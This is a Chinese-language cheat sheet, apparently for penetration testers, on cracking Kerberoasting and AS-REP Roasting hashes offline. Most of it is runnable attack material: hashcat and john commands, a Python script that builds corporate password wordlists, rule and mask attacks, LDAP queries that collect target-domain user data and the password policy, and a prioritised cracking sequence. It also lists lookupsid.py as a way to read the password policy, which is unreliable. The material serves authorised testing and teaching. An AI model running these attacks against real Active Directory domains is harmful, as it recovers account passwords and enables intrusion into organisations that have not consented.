# Kerberos 票据哈希破解参考

Kerberoasting 和 AS-REP Roasting 获取的哈希需要离线破解。本文档覆盖 hashcat/john 的最优配置、字典策略和掩码攻击模式。

---

## 1. Hashcat 模式速查

| 攻击类型 | 加密类型 | hashcat -m | 说明 |
|----------|----------|------------|------|
| Kerberoasting (TGS) | RC4-HMAC (etype 23) | **13100** | 最常见，速度最快 |
| Kerberoasting (TGS) | AES128 (etype 17) | **19600** | 较少见 |
| Kerberoasting (TGS) | AES256 (etype 18) | **19700** | 高安全域常见，速度慢 |
| AS-REP Roasting | RC4-HMAC (etype 23) | **18200** | 无需预认证的账户 |

### 哈希格式示例

```
# Kerberoasting RC4 (13100)
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$abc123...

# Kerberoasting AES256 (19700)
$krb5tgs$18$svc_sql$CORP.LOCAL$*MSSQLSvc/sql01.corp.local:1433*$abc123...

# AS-REP Roasting (18200)
$krb5asrep$23$jsmith@CORP.LOCAL:abc123...
```

---

## 2. Hashcat 最优 GPU 破解参数

### 基础命令

```bash
# Kerberoasting RC4 — 字典攻击
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -O -w 3

# AS-REP Roasting — 字典攻击
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -O -w 3

# Kerberoasting AES256 — 字典攻击（速度较慢，建议精选字典）
hashcat -m 19700 kerberoast_aes.txt custom_wordlist.txt -O -w 3
```

### 关键参数说明

```bash
# 性能优化参数
-O              # 启用优化内核（限制密码长度 <= 31，但速度提升 2-3 倍）
-w 3            # 工作负载 (1=低, 2=中, 3=高, 4=噩梦级/桌面卡顿)
--force         # 强制运行（忽略警告，仅在必要时使用）
-D 1,2          # 设备类型 (1=CPU, 2=GPU)

# 会话管理
--session=kerb1        # 命名会话，方便恢复
--restore              # 恢复上次中断的会话
--potfile-path=cracked.pot  # 已破解密码存储文件

# 输出
-o cracked.txt         # 破解结果输出文件
--outfile-format=2     # 只输出密码（默认 hash:password）
--show                 # 显示已破解的哈希
```

### GPU 破解速度参考（RTX 4090）

| 模式 | 加密类型 | 大约速度 |
|------|----------|----------|
| 13100 | RC4-HMAC | ~1.2 GH/s |
| 18200 | AS-REP RC4 | ~1.0 GH/s |
| 19700 | AES256 | ~200 KH/s |

> RC4 与 AES256 破解速度差距约 **6000 倍**。如果目标域强制 AES，需要更精确的字典。

---

## 3. 目标化字典生成策略

通用字典（rockyou）对企业环境效果有限。应结合目标信息生成专属字典。

### 收集信息用于字典生成

```bash
# 公司名及缩写
COMPANY="CorpName"
ABBR="CN"

# 从 AD 中收集信息
# 用户描述字段常包含默认密码
netexec ldap DC_IP -u USER -p PASS --users | awk '{print $5}'

# 收集自定义关键词
# - 公司名、产品名、项目名
# - 城市名、办公地点
# - 行业术语
# - 域名中的关键词
```

### 使用 CeWL 从企业网站提取关键词

```bash
cewl https://www.target-corp.com -d 3 -m 5 -w company_words.txt
```

### 使用 username-anarchy / cupp 生成

```bash
# cupp - 交互式密码生成
cupp -i
# 输入公司名、缩写、关键日期等

# 手动生成企业常见模式
cat <<'EOF' > corp_base.txt
CorpName
corpname
CORPNAME
Corp2024
Corp2025
Corp2026
Corp@2024
Corp@2025
Corp@2026
Welcome
Password
Qwer1234
P@ssw0rd
Admin
Spring
Summer
Autumn
Winter
January
February
EOF
```

### 年份和季节组合生成

```python
#!/usr/bin/env python3
"""generate_corp_wordlist.py — 生成企业场景密码字典"""

import itertools

company_names = ['CorpName', 'corpname', 'CORPNAME', 'Corp', 'CN']
seasons = ['Spring', 'Summer', 'Autumn', 'Winter', 'spring', 'summer', 'autumn', 'winter']
months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
years = ['2022', '2023', '2024', '2025', '2026']
separators = ['', '@', '#', '!', '_', '.']
suffixes = ['', '!', '@', '#', '123', '1234', '!@#']

passwords = set()

# 公司名 + 年份 + 后缀
for name, year, sep, suffix in itertools.product(company_names, years, separators, suffixes):
    passwords.add(f'{name}{sep}{year}{suffix}')

# 季节 + 年份 + 后缀
for season, year, suffix in itertools.product(seasons, years, suffixes):
    passwords.add(f'{season}{year}{suffix}')

# 月份 + 年份
for month, year, suffix in itertools.product(months, years, suffixes):
    passwords.add(f'{month}{year}{suffix}')

# 常见弱密码变体
common = ['Welcome1!', 'P@ssw0rd', 'Password1', 'Qwer1234!', 'Admin@123',
          'Changeme1!', 'Monday1!', 'Letmein1!', 'Company1!']
passwords.update(common)

with open('corp_wordlist.txt', 'w') as f:
    for p in sorted(passwords):
        f.write(p + '\n')

print(f'[+] 生成 {len(passwords)} 个密码候选')
```

---

## 4. 规则文件（Rules）

规则文件在字典基础上生成变体，指数级扩大搜索空间。

### 推荐规则文件

```bash
# hashcat 内置规则（按效果排序）
/usr/share/hashcat/rules/best64.rule              # 77 条规则，速度最快
/usr/share/hashcat/rules/rockyou-30000.rule        # 30000 条规则，覆盖广
/usr/share/hashcat/rules/d3ad0ne.rule              # 34101 条规则
/usr/share/hashcat/rules/T0XlC.rule                # 大型规则集

# 社区规则（需单独下载）
OneRuleToRuleThemAll.rule    # ~52000 条规则，综合最优
dive.rule                     # 超大规则集，深度破解
pantagrule.hashorg.v6.rule   # 基于真实密码泄露统计
```

### 使用规则攻击

```bash
# 字典 + 单规则文件
hashcat -m 13100 kerberoast.txt corp_wordlist.txt -r /usr/share/hashcat/rules/best64.rule -O -w 3

# 字典 + 多规则文件叠加（规则组合，搜索空间爆炸增长）
hashcat -m 13100 kerberoast.txt corp_wordlist.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  -r /usr/share/hashcat/rules/toggles1.rule -O -w 3

# 使用 OneRuleToRuleThemAll
hashcat -m 13100 kerberoast.txt corp_wordlist.txt -r OneRuleToRuleThemAll.rule -O -w 3
```

### 自定义规则示例

```bash
# 保存为 custom_corp.rule
# 在末尾添加数字和符号
$1          # 追加 '1'
$!          # 追加 '!'
$1 $!       # 追加 '1!'
$@ $1       # 追加 '@1'
$2 $0 $2 $4 # 追加 '2024'
$2 $0 $2 $5 # 追加 '2025'
$2 $0 $2 $6 # 追加 '2026'

# 首字母大写
c           # capitalize
c $!        # capitalize + '!'
c $1 $!     # capitalize + '1!'
c $@ $1 $2 $3  # capitalize + '@123'

# leet speak
s a @       # a → @
s e 3       # e → 3
s o 0       # o → 0
s i 1       # i → 1
s s $       # s → $
```

---

## 5. 掩码攻击（Mask Attack）

当推测密码结构时，掩码攻击比纯字典更高效。

### 掩码字符集

```
?l = a-z          (小写字母)
?u = A-Z          (大写字母)
?d = 0-9          (数字)
?s = 特殊字符      (空格及 !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~)
?a = ?l?u?d?s     (全部可打印字符)

# 自定义字符集
-1 ?l?u     (自定义集1: 大小写字母)
-2 ?l?d     (自定义集2: 小写+数字)
```

### 企业密码常见模式

```bash
# 模式: Season + Year (如 Spring2024)
# 首字母大写 + 5小写 + 4数字 = 10位
hashcat -m 13100 kerberoast.txt -a 3 '?u?l?l?l?l?l?d?d?d?d' -O -w 3

# 模式: Season + Year + 符号 (如 Spring2024!)
hashcat -m 13100 kerberoast.txt -a 3 '?u?l?l?l?l?l?d?d?d?d?s' -O -w 3

# 模式: Company + 数字 (如 Corp123, Corp1234)
# 使用递增长度
hashcat -m 13100 kerberoast.txt -a 3 '?u?l?l?l?d?d?d' --increment --increment-min=6 --increment-max=10 -O -w 3

# 模式: 大写开头 + 小写 + 数字 + 符号 (如 Password1!)
hashcat -m 13100 kerberoast.txt -a 3 '?u?l?l?l?l?l?l?l?d?s' -O -w 3

# 模式: 键盘模式 (Qwer1234!)
# 无法用纯掩码表达，用字典+规则更好
```

### 精确掩码（已知部分密码）

```bash
# 已知密码以 "Corp" 开头，后跟 4 位数字
hashcat -m 13100 kerberoast.txt -a 3 'Corp?d?d?d?d' -O -w 3

# 已知密码以 "Corp" 开头，后跟年份和符号
hashcat -m 13100 kerberoast.txt -a 3 'Corp202?d?s' -O -w 3

# 已知密码策略: 8-12位，大写开头，含数字和符号
hashcat -m 13100 kerberoast.txt -a 3 '?u?l?l?l?l?l?d?s' --increment --increment-min=8 --increment-max=12 -O -w 3
```

---

## 6. 混合攻击（Hybrid Attack）

字典 + 掩码组合，兼顾灵活性和速度。

```bash
# 模式6: 字典 + 掩码追加 (Password + 1234)
hashcat -m 13100 kerberoast.txt -a 6 corp_base.txt '?d?d?d?d' -O -w 3

# 模式6: 字典 + 年份 + 符号
hashcat -m 13100 kerberoast.txt -a 6 corp_base.txt '?d?d?d?d?s' -O -w 3

# 模式7: 掩码前缀 + 字典 (2024 + Password)
hashcat -m 13100 kerberoast.txt -a 7 '?d?d?d?d' corp_base.txt -O -w 3

# 实用组合 — 基础词 + 年份 + 常见后缀
hashcat -m 13100 kerberoast.txt -a 6 corp_base.txt '2024!'  -O -w 3
hashcat -m 13100 kerberoast.txt -a 6 corp_base.txt '2025!'  -O -w 3
hashcat -m 13100 kerberoast.txt -a 6 corp_base.txt '@123'   -O -w 3
hashcat -m 13100 kerberoast.txt -a 6 corp_base.txt '!@#'    -O -w 3
```

---

## 7. 不同密码长度的预估破解时间

以 RTX 4090 + RC4 (13100) 约 1.2 GH/s 为基准:

| 密码长度 | 字符集 | 组合数 | 预估时间 |
|----------|--------|--------|----------|
| 6 位 | 小写+数字 | 2.2 × 10^9 | **~2 秒** |
| 7 位 | 小写+数字 | 7.8 × 10^10 | **~65 秒** |
| 8 位 | 小写+数字 | 2.8 × 10^12 | **~39 分钟** |
| 8 位 | 大小写+数字 | 2.2 × 10^14 | **~2 天** |
| 8 位 | 全字符 | 6.6 × 10^15 | **~64 天** |
| 9 位 | 大小写+数字 | 1.4 × 10^16 | **~134 天** |
| 10 位 | 大小写+数字 | 8.4 × 10^17 | **~22 年** |

> 结论: 纯暴力只对 8 位以下密码有效。8 位以上必须依赖字典 + 规则 + 掩码组合策略。

### AES256 (19700) 速度参考

AES256 约 200 KH/s（RTX 4090），比 RC4 慢约 6000 倍。

| 密码长度 | 字符集 | 预估时间 |
|----------|--------|----------|
| 6 位 | 小写+数字 | **~3 小时** |
| 7 位 | 小写+数字 | **~4.5 天** |
| 8 位 | 小写+数字 | **~163 天** |

> AES256 哈希只能依赖精准字典攻击，纯暴力几乎不可行。

---

## 8. John the Ripper 等效命令

```bash
# Kerberoasting RC4
john --format=krb5tgs kerberoast.txt --wordlist=corp_wordlist.txt
john --format=krb5tgs kerberoast.txt --wordlist=corp_wordlist.txt --rules=best64

# AS-REP Roasting
john --format=krb5asrep asrep.txt --wordlist=corp_wordlist.txt

# Kerberoasting AES256
john --format=krb5tgs-aes kerberoast_aes.txt --wordlist=corp_wordlist.txt

# 增量模式（暴力）
john --format=krb5tgs kerberoast.txt --incremental=Alnum --max-length=8

# 显示已破解密码
john --show kerberoast.txt

# 掩码模式（John 语法）
john --format=krb5tgs kerberoast.txt --mask='?u?l?l?l?l?l?d?d?d?d'

# 字典 + 掩码混合
john --format=krb5tgs kerberoast.txt --wordlist=corp_base.txt --mask='?w?d?d?d?d'
# ?w 代表字典中的词
```

### hashcat 与 john 功能对比

| 功能 | hashcat | john |
|------|---------|------|
| GPU 加速 | 原生支持 | 需 OpenCL 编译 |
| RC4 速度 | ~1.2 GH/s | ~50 MH/s (GPU) |
| 规则语法 | hashcat 格式 | john 格式（兼容 hashcat） |
| 会话恢复 | --restore | --restore |
| 优先推荐 | GPU 暴力/掩码 | CPU 字典/规则 |

---

## 9. 基于密码策略的破解策略

获取域密码策略后，可以大幅缩小搜索空间。

### 获取密码策略

```bash
# 通过 netexec
netexec ldap DC_IP -u USER -p PASS --pass-pol

# 通过 impacket
python3 lookupsid.py DOMAIN/USER:PASS@DC_IP

# 通过 PowerShell (域内)
Get-ADDefaultDomainPasswordPolicy

# 关注这些字段:
# Minimum Password Length:    8
# Password Complexity:        Enabled
# Password History:           24
# Maximum Password Age:       90 days
# Lockout Threshold:          5
```

### 根据策略优化

**最小长度 8 位 + 复杂性要求**（至少包含大小写字母+数字+符号中的 3 类）:

```bash
# 最高效策略: 首字母大写 + 小写 + 数字 + 尾部符号
# 这是用户最常用的满足复杂性的模式
hashcat -m 13100 kerberoast.txt -a 3 '?u?l?l?l?l?l?d?s' -O -w 3
hashcat -m 13100 kerberoast.txt -a 3 '?u?l?l?l?l?l?l?d?s' -O -w 3

# 或者: 常见词 + 数字 + 符号
hashcat -m 13100 kerberoast.txt -a 6 corp_base.txt '?d?s' -O -w 3
hashcat -m 13100 kerberoast.txt -a 6 corp_base.txt '?d?d?s' -O -w 3
hashcat -m 13100 kerberoast.txt -a 6 corp_base.txt '?d?d?d?s' -O -w 3
```

**最小长度 12 位**:

```bash
# 12 位以上暴力不现实，必须用高质量字典
# 常见满足方式: 多词组合 (passphrase) 或 公式化密码

# 公式化密码: CompanyName@2024!
hashcat -m 13100 kerberoast.txt -a 6 company_variants.txt '?d?d?d?d?s' -O -w 3
hashcat -m 13100 kerberoast.txt -a 6 company_variants.txt '@2024!' -O -w 3
hashcat -m 13100 kerberoast.txt -a 6 company_variants.txt '@2025!' -O -w 3

# passphrase 字典
hashcat -m 13100 kerberoast.txt passphrases.txt -r best64.rule -O -w 3
```

**无复杂性要求**（老旧域）:

```bash
# 纯数字密码（很多用户会用）
hashcat -m 13100 kerberoast.txt -a 3 '?d?d?d?d?d?d?d?d' --increment --increment-min=6 -O -w 3

# 纯小写
hashcat -m 13100 kerberoast.txt -a 3 '?l?l?l?l?l?l?l?l' --increment --increment-min=6 -O -w 3

# rockyou 直接上
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -O -w 3
```

### 破解优先级（推荐执行顺序）

```bash
# 1. 先用小字典 + 最佳规则（5 分钟内出结果的弱密码）
hashcat -m 13100 hashes.txt corp_wordlist.txt -r best64.rule -O -w 3

# 2. 大字典直跑（rockyou / weakpass 等）
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -O -w 3

# 3. 小字典 + 大规则集
hashcat -m 13100 hashes.txt corp_wordlist.txt -r OneRuleToRuleThemAll.rule -O -w 3

# 4. 混合攻击（基础词 + 数字/符号追加）
hashcat -m 13100 hashes.txt -a 6 corp_base.txt '?d?d?d?d?s' -O -w 3

# 5. 掩码暴力（针对已知模式）
hashcat -m 13100 hashes.txt -a 3 '?u?l?l?l?l?l?d?d?d?d?s' -O -w 3

# 6. 超大字典 + 规则（最后手段，可能跑数天）
hashcat -m 13100 hashes.txt weakpass_3.txt -r dive.rule -O -w 3
```

---

## 参考链接

- [Hashcat Wiki - Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [Hashcat Rule-based Attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
- [OneRuleToRuleThemAll - GitHub](https://github.com/NotSoSecure/password_cracking_rules)
- [Kerberoast - HarmJ0y](https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)
